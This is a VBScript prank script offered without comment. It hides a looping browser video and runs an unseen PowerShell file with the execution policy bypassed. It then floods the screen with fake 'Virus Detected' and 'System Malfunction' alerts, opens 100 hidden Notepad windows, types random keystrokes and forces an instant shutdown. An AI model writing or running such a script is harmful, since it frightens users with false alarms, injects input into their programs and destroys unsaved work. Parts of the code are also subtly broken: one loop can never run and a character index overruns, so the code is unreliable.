Set WshShell = CreateObject("WScript.Shell")
Set ie = CreateObject("InternetExplorer.Application")

' Open YouTube in a hidden browser with loop enabled
ie.Visible = False
ie.Navigate "https://www.youtube.com/embed/uLghjAKpBMU?autoplay=1&loop=1&playlist=uLghjAKpBMU"

' Start glitch effect using PowerShell (instantly)
WshShell.Run "powershell -ExecutionPolicy Bypass -File glitch.ps1", 0, False

' Start flooding errors as fast as possible
startTime = Timer
Do While Timer - startTime < 60
    errorMessages = Array("System Malfunction!", "Critical Error!", "Memory Overload!", "Virus Detected!", "Fatal System Fault!", "Device Failure!", "Unknown Process Running!", "Unauthorized Access Detected!")

    ' Loop through all error messages instantly
    For i = 0 To UBound(errorMessages)
        iconTypes = Array(vbCritical, vbExclamation, vbQuestion, vbInformation)
        randIcon = iconTypes(Int(Rnd * 4))
        WshShell.Run "mshta vbscript:msgbox(""" & errorMessages(i) & """, " & randIcon & ", ""System Alert"")", 0, False
    Next
    WScript.Sleep 5 ' **SUPER FAST ERROR FLOODING**
Loop

' Open 100 Notepad windows, one per second
For i = 1 To 100
    WshShell.Run "notepad", 0, False
    WScript.Sleep 1000 ' **Wait 1 second before opening the next one**
Next

' Typing loop for 60 seconds
Do While Timer - startTime < 60
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/`~"
    output = ""

    ' Generate random text instantly
    For i = 1 To 20
        output = output & Mid(chars, Int((Len(chars) * Rnd) * Len(chars) + 1), 1)
    Next

    ' Randomly press Enter or Space
    specialKeys = Array("{ENTER}", " ")
    randKey = specialKeys(Int(Rnd * 2))
    WshShell.SendKeys output & randKey
    WScript.Sleep 300
Loop

' Shutdown after one minute
WshShell.Run "shutdown -s -t 0"
